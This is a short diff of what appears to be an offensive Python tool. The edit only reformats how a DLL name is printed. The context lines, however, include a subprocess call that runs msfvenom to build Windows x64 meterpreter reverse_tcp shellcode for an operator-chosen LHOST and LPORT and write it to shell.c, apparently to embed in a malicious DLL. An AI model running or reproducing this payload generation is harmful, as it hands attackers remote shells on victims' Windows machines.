@@ -29,12 +29,13 @@ else:
 
 if args.dll_name:
     dll_name = args.dll_name
-    print(f"DLL NAME: {colored(f'{args.dll_name}\n','green',attrs=['bold'])}")
+    print(f"DLL NAME: {colored(f'{args.dll_name}','green',attrs=['bold'])}")
+    print()
 else:
     dll_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
-    print(f"DLL NAME: {colored(f'{dll_name} (RANDOM)\n','green',attrs=['bold'])}")
-
-
+    print(f"DLL NAME: {colored(f'{dll_name} (RANDOM)','green',attrs=['bold'])}")
+    print()
+	
 # Create Shellcode using MSFVENOM 
 subprocess.run(f'msfvenom --arch x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST={args.lhost} LPORT={args.lport} -f c -o shell.c',shell=True,stderr=subprocess.DEVNULL)
 with open("./shell.c","r") as shellcode:
